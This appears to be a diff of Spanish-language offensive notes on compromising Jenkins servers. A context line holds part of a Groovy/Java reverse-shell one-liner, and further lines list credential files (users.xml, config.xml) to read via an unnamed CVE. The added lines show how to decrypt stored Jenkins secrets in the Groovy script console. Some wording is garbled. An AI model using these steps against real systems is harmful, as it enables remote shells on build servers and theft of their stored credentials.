@@ -13,3 +13,11 @@ Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new
 Rutas a mirar con el CVE:
 /users/users.xml
 /users/user_cod/config.xml
+
+
+
+- Credenciales, le das la herramienta y en el conealed veras como como .privatekey:
+En el console de groovy
+```bash
+println(hudson.util.Secret.decrypt("VALOR_ENTRE_CORCHETES"))
+```
